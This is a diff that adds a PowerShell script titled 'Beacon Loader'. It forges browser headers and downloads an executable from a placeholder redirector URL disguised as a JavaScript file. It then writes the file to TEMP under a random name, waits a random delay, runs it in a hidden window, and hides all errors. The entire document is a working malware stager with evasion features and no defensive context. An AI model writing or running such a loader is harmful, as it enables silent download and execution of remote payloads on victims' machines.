@@ -1,0 +1,16 @@
+# Windows PowerShell Beacon Loader
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+$ErrorActionPreference = "SilentlyContinue"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
+$wc.Headers.Add("Accept-Language", "en-US,en;q=0.9")
+$wc.Headers.Add("Referer", "https://REDIRECTOR_PLACEHOLDER/")
+$url = "https://REDIRECTOR_PLACEHOLDER/static/js/update.js"
+$outpath = "$env:TEMP\update-$(New-Guid).exe"
+try {
+    $wc.DownloadFile($url, $outpath)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 3000)
+    Start-Process -WindowStyle Hidden -FilePath $outpath
+} catch {
+    # Fail silently
+}
